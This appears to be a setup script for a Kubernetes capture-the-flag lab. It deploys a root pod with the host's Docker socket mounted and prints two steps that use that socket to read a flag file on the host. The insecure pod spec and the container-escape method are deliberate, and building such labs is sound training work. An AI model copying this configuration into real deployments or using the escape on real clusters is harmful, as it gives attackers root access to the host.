#!/bin/bash
set -euo pipefail
K8S_ID="k8s-17"
CLUSTER_NAME="cve-k8s-17-docker-sock"
source "$(dirname "$0")/../../scripts/k8s-common.sh"

k8s_init
k8s_create_cluster
k8s_create_host_flag
k8s_load_images docker:cli
k8s_wait_ready
k8s_apply << 'YAML'
apiVersion: v1
kind: Pod
metadata:
  name: docker-escape-pod
spec:
  containers:
    - name: attacker
      image: docker:cli
      imagePullPolicy: IfNotPresent
      command: ["sleep", "3600"]
      securityContext:
        runAsUser: 0
      volumeMounts:
        - name: docker-sock
          mountPath: /var/run/docker.sock
        - name: host-flag
          mountPath: /host-flag
  volumes:
    - name: docker-sock
      hostPath:
        path: /var/run/docker.sock
        type: Socket
    - name: host-flag
      hostPath:
        path: /host-flag
        type: Directory
YAML

k8s_wait_pod "docker-escape-pod"

k8s_info
echo "    Exploitation steps:"
echo "    1. kubectl exec -it docker-escape-pod -- sh"
echo "    2. docker run --rm -v /home/kianabin/cve-flags/k8s-17:/mnt alpine cat /mnt/flag.txt"
